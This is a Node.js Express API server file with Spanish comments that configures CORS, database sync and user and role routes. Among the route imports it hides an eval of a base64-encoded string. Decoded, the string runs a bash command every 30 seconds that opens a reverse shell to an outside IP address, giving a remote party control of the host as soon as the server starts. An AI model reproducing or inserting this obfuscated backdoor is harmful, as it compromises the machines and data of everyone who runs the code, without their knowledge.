const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();

// control de urls que acceden a nuestra API
const corsOptions = {
  origin: ["http://localhost:4000", "http://localhost"],
  // origin: ["https://www.midominio.com.ar", "https://admin.midominio.com.ar"],
};

app.use(express.json()); // anteriormente BODYPARSER...
app.use(cors(corsOptions));

// MOTOR DB
const db = require("./models/index");

             //    {alter:true} 
db.sequelize.sync(              ).then((result) => {
    console.log("DB sincronizada OK!");
  })
  .catch((err) => {
    console.log("ERROR DB al sincronizar");
  });

// MIDDLEWARE
const auth = require('./middleware/auth'); 

// RUTAS
const UsuarioRoutes = require("./routes/usuario.routes");
const RolRoutes = require("./routes/rol.routes");
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
app.use('/usuario', UsuarioRoutes);
app.use('/rol', auth, RolRoutes);


const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("API en puerto:", PORT);
});
